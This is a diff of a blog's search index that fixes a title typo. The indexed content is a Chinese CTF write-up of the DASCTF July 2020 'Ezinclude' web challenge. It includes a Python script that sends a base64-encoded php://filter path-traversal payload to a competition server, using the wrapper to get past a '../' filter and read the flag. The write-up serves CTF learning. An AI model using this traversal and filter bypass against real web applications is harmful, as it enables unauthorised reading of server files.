@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>DASCTeF_7月赛</title>
+    <title>DASCTF_7月赛</title>
     <url>/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ezinclude"><a href="#1-Ezinclude" class="headerlink" title="1.Ezinclude"></a>1.Ezinclude</h3><p>  URL的请求加了个unix时间戳，只能写脚本淦。后面测试发现gqy.jpg和/gqy.jpg回显相同，可以判断文件名前拼接了路径，这种情况无法使用wrapper等手段的。同时waf也会过滤 <code>../</code>。尝试多次都没包含成功，就强行用了下伪协议成功了，后面看了源码醉了，如果f参数的开头给出一个目录再穿越就可以绕过waf了。这里的伪协议就相当于目录。</p><a id="more"></a>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">file=<span class="string">b'php://filter/read=convert.base64-encode/resource=../../../../../../../../../../flag'</span></span><br><span class="line">t=int(time.time())</span><br><span class="line">f= base64.b64encode(file).decode()</span><br><span class="line">url = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t,f)</span><br><span class="line"><span class="comment">#print(url)</span></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
